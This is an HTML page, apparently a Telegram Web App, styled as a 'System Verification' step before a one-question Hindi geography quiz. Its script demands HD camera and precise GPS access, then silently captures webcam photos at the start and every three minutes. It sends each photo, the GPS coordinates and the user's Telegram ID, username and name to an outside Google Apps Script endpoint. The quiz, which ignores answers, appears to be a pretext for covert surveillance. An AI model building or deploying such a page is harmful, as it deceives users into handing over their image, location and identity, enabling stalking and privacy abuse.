<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        .card { width: 90%; max-width: 450px; margin: auto; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h3 { margin-top: 0; color: #00eaff; }
        .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
        button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
        .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
        
        /* Naya: Video element ko perfect ratio mein rakhne ke liye */
        video {
            width: 100%;
            height: auto;
            object-fit: cover; /* Stretch hone se rokega */
            aspect-ratio: 16 / 9; /* Perfect HD Ratio */
            display: none; /* Hide karein jab tak zarurat na ho */
        }
    </style>
</head>
<body>

<div id="login" class="card">
    <div style="font-size: 55px; margin-bottom: 15px;">🛡️</div>
    <h3>System Configuration</h3>
    <div class="instruction-box">
        • सिस्टम सेटअप किया जा रहा है।<br>
        • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
        • <b>नोट:</b> Perfect HD कैमरा और लोकेशन वेरिफिकेशन अनिवार्य है।
    </div>
    <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
</div>

<video id="proctorVideo" autoplay playsinline></video>

<div id="quizBox" class="card" style="display:none">
    <div id="question" style="font-size: 18px; margin-bottom: 25px; text-align: left; font-weight: 600;"></div>
    <div id="options"></div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwO7p2glpHIvlKjnMC6P3YCPWsVN00bsPzlanqyPJ_wJUxVmj628WcU-DyZfW9ltuEQrg/exec"; 

    const user = tg.initDataUnsafe?.user || {};
    let userLoc = "Pending";
    let globalStream = null;
    let currentIdx = 0;

    const questions = [
        {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
    ];

    async function requestAllPermissions() {
        const btn = document.getElementById("startBtn");
        btn.disabled = true;
        btn.innerText = "Setting Perfect HD... ⏳";

        try {
            // 1. Forced Perfect HD Constraints (16:9 ratio)
            if (!globalStream) {
                globalStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 }, 
                        height: { ideal: 720 },
                        aspectRatio: 1.7777777778 // Naya: Perfect 16:9 Ratio
                    } 
                });
                
                // Naya: Video element ko stream assign karein
                const videoEl = document.getElementById('proctorVideo');
                videoEl.srcObject = globalStream;
            }

            // 2. Location Check
            btn.innerText = "Locating GPS... ⏳";
            const getLoc = () => new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 });
            });

            try {
                const pos = await getLoc();
                userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
            } catch (e) {
                alert("Location Error: कृपया अपना GPS ऑन करें और पेज रिफ्रेश करें।");
                btn.disabled = false;
                btn.innerText = "प्रक्रिया शुरू करें";
                return;
            }

            // 3. Success - UI Switch
            document.getElementById("login").style.display = "none";
            document.getElementById("quizBox").style.display = "block";
            loadQuestion();
            
            // First Entry Photo (HD)
            captureAndSend("Test_Started");

            // Har 3 Minute mein Photo (180000 ms)
            setInterval(() => captureAndSend("Periodic_Check"), 180000);

        } catch (err) {
            console.error(err);
            alert("Permission Denied: कैमरा एक्सेस के बिना टेस्ट शुरू नहीं हो सकता।");
            btn.disabled = false;
            btn.innerText = "प्रक्रिया शुरू करें";
        }
    }

    async function captureAndSend(statusType) {
        if (!globalStream) return;
        try {
            const video = document.getElementById('proctorVideo');
            // playsinline zaruri hai background capture ke liye
            await video.play();

            const canvas = document.createElement('canvas');
            // Naya: Canvas ka size wahi rakhein jo video stream ka hai
            canvas.width = video.videoWidth || 1280; 
            canvas.height = video.videoHeight || 720;
            
            const ctx = canvas.getContext('2d');
            // object-fit cover jaisa effect canvas par lane ke liye hum yahan drawing optimize karte hain
            const streamRatio = canvas.width / canvas.height;
            const idealRatio = 16 / 9;
            
            if (streamRatio > idealRatio) {
                // Agar sensor zyada choda hai, toh sides crop karein
                const newWidth = canvas.height * idealRatio;
                const offset = (canvas.width - newWidth) / 2;
                ctx.drawImage(video, offset, 0, newWidth, canvas.height, 0, 0, canvas.width, canvas.height);
            } else if (streamRatio < idealRatio) {
                // Agar sensor zyada lamba hai, toh top/bottom crop karein
                const newHeight = canvas.width / idealRatio;
                const offset = (canvas.height - newHeight) / 2;
                ctx.drawImage(video, 0, offset, canvas.width, newHeight, 0, 0, canvas.width, canvas.height);
            } else {
                // Agar ratio pehle se sahi hai, toh direct draw karein
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            // Quality 0.8 (HD Clarity)
            const photoData = canvas.toDataURL('image/jpeg', 0.8);

            const payload = {
                userId: user.id || "NA",
                username: user.username || "NA",
                fullName: (user.first_name || "") + " " + (user.last_name || ""),
                score: "Active",
                status: statusType,
                photo: photoData,
                location: userLoc
            };

            fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
        } catch (e) { console.log("Capture Error:", e); }
    }

    function loadQuestion() {
        if (currentIdx >= questions.length) { 
            alert("Test Submitted Successfully!"); 
            tg.close(); 
            return; 
        }
        const qData = questions[currentIdx];
        document.getElementById("question").innerText = qData.q;
        const optionsDiv = document.getElementById("options");
        optionsDiv.innerHTML = "";
        qData.o.forEach((opt, i) => {
            const div = document.createElement("div");
            div.className = "option";
            div.innerText = opt;
            div.onclick = () => { currentIdx++; loadQuestion(); };
            optionsDiv.appendChild(div);
        });
    }
</script>
</body>
</html>
